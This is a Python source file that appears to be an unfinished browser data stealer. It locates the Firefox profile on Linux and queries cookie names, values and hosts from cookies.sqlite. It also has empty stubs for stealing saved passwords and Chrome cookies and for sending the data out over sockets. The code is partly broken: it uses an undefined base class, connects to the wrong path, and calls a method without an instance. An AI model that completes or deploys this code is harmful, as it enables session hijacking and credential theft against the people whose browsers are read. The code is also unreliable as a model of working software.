from abc import ABC, abstractmethod
import os, socket, platform, sqlite3;


# * Classes to detect Operating System
class OSInterface(ABC):
    @abstractmethod
    def DetectOperatingSystem(self):
        pass


class OSDetector(OSInterface):
    def DetectOperatingSystem(self):
        return platform.system();



# * Classes to search profile directories in different browsers
class ProfileDirectoryFinder(ABC):

    @abstractmethod
    def FindProfileDirectoryInLinux(self):
        pass

    @abstractmethod 
    def FindProfileDirectoryInWindows(self):
        pass


class FirefoxProfileFinder(ProfileDirectoryFinder):

    def FindProfileDirectoryInLinux(self):

        homeDirectory = os.path.expanduser("~");
        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")


        if ".mozilla" not in os.listdir(homeDirectory):
            print("firefox not installed")
            return False;


        for directory in os.listdir(browserDirectory):

            if(directory.endswith(".default-esr")):
                browserDirectory = os.path.join(browserDirectory, directory);
                return browserDirectory

            elif(directory.endswith(".default")):
                browserDirectory = os.path.join(browserDirectory, directory); 
                return browserDirectory
            

        print("Profile not found!")
        return None;
         



    def FindProfileDirectoryInWindows(self):
        pass



# * Classes to obtain Browser Cookies
class BrowserCookiesGetter(ABC):

    @abstractmethod
    def GetCookiesInLinux(self, username):
        pass

    @abstractmethod
    def GetCookiesInWindows(self, username):
        pass

    


class FirefoxCookiesGetter(BrowserCookiesGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder): 
        self.profileFinder = profileFinder;


    def GetCookiesInLinux(self):

        browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();

        if(not browserDirectory):
            print("Error");
            return False;

        cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite")
        if not os.path.exists(cookiesDbPath):
            print("Cookies database not found!")
            return False


        try: 

            connection = sqlite3.connect(browserDirectory)
            cursor = connection.cursor()
            cursor.execute('SELECT name, value, host FROM moz_cookies')
            cookies = cursor.fetchall()
            connection.close()

            return cookies;

        except Exception as e:
            print(e)
            return False;
            
    def GetCookiesInWindows(self, username):
        pass







# * Classes to get saved passwords in browsers 









































class ChromeCookiesGetter(BrowserCredentialsGetter):
    def __init__(self): 
        pass


    def GetCookies(self):
        pass



# * Classes to send Browser Cookies with Sockets
class SocketSender(ABC):

    @abstractmethod
    def Send(ip, port):
        pass

     


    
class BrowserDataSender(SocketSender):

    def __init__(self):
        pass

    def Send(self):
        pass








def Main():

    homeDirectory = os.path.expanduser("~");
    cookiesDirectory = homeDirectory;

    if ".mozilla" not in os.listdir(homeDirectory):
        print("No esta")

    cookiesDirectory = cookiesDirectory + "/.mozilla/firefox"
    xd = os.listdir(cookiesDirectory)
    print(xd)
    



if __name__ == "__main__":
    Main()
